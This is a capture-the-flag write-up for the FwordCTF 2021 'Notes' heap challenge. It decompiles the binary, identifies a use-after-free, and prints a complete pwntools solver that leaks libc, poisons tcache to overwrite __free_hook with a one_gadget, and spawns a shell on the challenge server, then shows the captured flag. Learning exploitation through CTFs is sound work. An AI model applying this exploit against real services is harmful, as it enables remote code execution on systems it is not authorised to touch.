# Notes

> You can always manage your notes
> nc 40.71.72.198 1235



Given 2 files, the binary itself and libc version 2.27. From that version we know that this libc is using tcache bins. Lets try run and decompile the program. 

```
➜  Notes git:(main) ✗ ./task2 
Select an action
(1) create a note
(2) delete a note
(3) edit a note
(4) view a note
(5) exit
>> 
```

Same as usual "notes" challenge, this is heap exploitation task. Now reverse the binary using IDA.

**create()**

~~~C
unsigned int create()
{
  int nbytes; // [rsp+8h] [rbp-98h] BYREF
  int nbytes_4; // [rsp+Ch] [rbp-94h]
  char buf[136]; // [rsp+10h] [rbp-90h] BYREF
  unsigned __int64 v4; // [rsp+98h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  nbytes_4 = read_index();
  if ( nbytes_4 == -1 || *((_QWORD *)&notes + nbytes_4) )
    return puts("wrong index");
  puts("size : ");
  printf(">> ");
  __isoc99_scanf("%d", &nbytes);
  if ( nbytes <= 0 || nbytes > 143 )
    return puts("That's too much !");
  *((_QWORD *)&notes + nbytes_4) = malloc(nbytes);
  puts("content : ");
  printf(">> ");
  read(0, buf, (unsigned int)nbytes);
  buf[strlen(buf) - 1] = 0;
  return (unsigned int)strcpy(*((char **)&notes + nbytes_4), buf);
}
~~~

**delete()**

~~~C
int delete()
{
  int result; // eax

  result = read_index();
  if ( result != -1 )
  {
    free(*((void **)&notes + result));
    return puts("note deleted");
  }
  return result;
}
~~~

**edit()**

~~~C
int edit()
{
  int result; // eax
  size_t v1; // rax
  int v2; // [rsp+Ch] [rbp-4h]

  result = read_index();
  v2 = result;
  if ( result != -1 )
  {
    puts("New content : ");
    printf(">> ");
    v1 = strlen(*((const char **)&notes + v2));
    read(0, *((void **)&notes + v2), v1);
    return puts("note updated !");
  }
  return result;
}
~~~

**view()**

~~~C
int view()
{
  __int64 v0; // rax
  int index; // [rsp+Ch] [rbp-4h]

  index = read_index();
  v0 = *((_QWORD *)&notes + index);
  if ( v0 && index != -1 )
    LODWORD(v0) = puts(*((const char **)&notes + index));
  return v0;
}
~~~



The bug is **edit()** and **view()** function didnt check if the heap is freed or not. So we get **Use-After-Free** here. Theres some restriction in **create()**  that we cant allocate more than 143 bytes, but this is not a hard problem. Now jump into exploitation step



### Main Idea

The main idea of the exploitation is :

- Allocate 10 chunk with size 143 so that our chunk will placed at tcache and unsorted bin 
- free all the chunk
- Leak the main arena pointer in order to get libc base
- Allocate and free 2 chunk with size 8
- Edit the chunk with __free_hook address
- malloc with one_gadget address



### Exploitation

**solver.py**

~~~python
from pwn import *


# f = process("./task2")
f = remote("40.71.72.198", 1235)
ELF_libc = ELF("libc-2.27.so")

def malloc(idx, size, content):
	f.sendlineafter(">> ", "1")
	f.sendlineafter(">> ", str(idx))
	f.sendlineafter(">> ", str(size))
	f.sendlineafter(">> ", str(content))

def free(idx):
	f.sendlineafter(">> ", "2")
	f.sendlineafter(">> ", str(idx))

def edit(idx, content):
	f.sendlineafter(">> ", "3")
	f.sendlineafter(">> ", str(idx))
	f.sendlineafter(">> ", str(content))

def show(idx):
	f.sendlineafter(">> ", "4")
	f.sendlineafter(">> ", str(idx))




if len(sys.argv) > 2:
	gdb.attach(f, "c")

for i in range(10):
	malloc(i, 143, "")

for i in range(9):
	free(i)



show(7)
leak = f.recvline().strip()
leak = leak.ljust(8, "\x00")
leak = u64(leak)
libc = leak - 4111520 # main_arena
log.info("libc base @ " + hex(libc))
target = libc+ELF_libc.symbols['__free_hook']
log.info("__free_hook @ " + hex(target))
one_shot = libc + 0x4f432

# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL


malloc(10, 8, "")
malloc(11, 8, "")
free(10)
free(11)
edit(11, p64(target).replace("\x00", ""))
malloc(12, 8, "")
malloc(13, 8, p64(one_shot).replace("\x00", ""))
free(12)

f.interactive()
~~~



```
➜  Notes git:(main) ✗ python solver.py 
[+] Opening connection to 40.71.72.198 on port 1235: Done
[*] '/home/syahrul/Desktop/Writeups/FwordCTF_2021/pwn/Notes/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc base @ 0x7f31fe952000
[*] __free_hook @ 0x7f31fed3f8e8
[*] Switching to interactive mode
$ ls
flag.txt
task2
task2.c
ynetd
$ cat flag.txt
FwordCTF{i_l0V3_ru5tY_n0tEs_7529271026587478}
$ 
```



**FLAG:** FwordCTF{i_l0V3_ru5tY_n0tEs_7529271026587478} 
